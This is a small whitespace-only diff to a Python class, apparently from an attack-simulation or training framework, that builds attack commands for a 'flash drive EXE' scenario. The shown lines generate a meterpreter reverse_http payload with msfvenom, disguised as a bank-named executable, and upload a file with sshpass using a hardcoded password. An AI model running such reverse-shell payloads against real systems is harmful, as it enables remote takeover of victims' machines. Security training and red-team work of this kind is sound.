@@ -49,8 +49,8 @@ class FlashdriveEXEAttack(Attack):
         lhost = self.options.lhost
         lport = self.options.lport
         meterpreter_script = (
-        	f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} "
-        	"-a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
+            f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST={lhost} LPORT={lport} "
+            "-a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
         return meterpreter_script
 
     def _generate_image_commands(self):
@@ -69,6 +69,6 @@ class FlashdriveEXEAttack(Attack):
         image_path = self.image_path
         rhost = self.options.rhost
         upload_command = (
-        	f"sshpass -p 'breach' scp {image_path} ssh@{rhost}:/BREACH/ "
-        	"&& echo 'Image file successfully sent'")
+            f"sshpass -p 'breach' scp {image_path} ssh@{rhost}:/BREACH/ "
+            "&& echo 'Image file successfully sent'")
         return upload_command
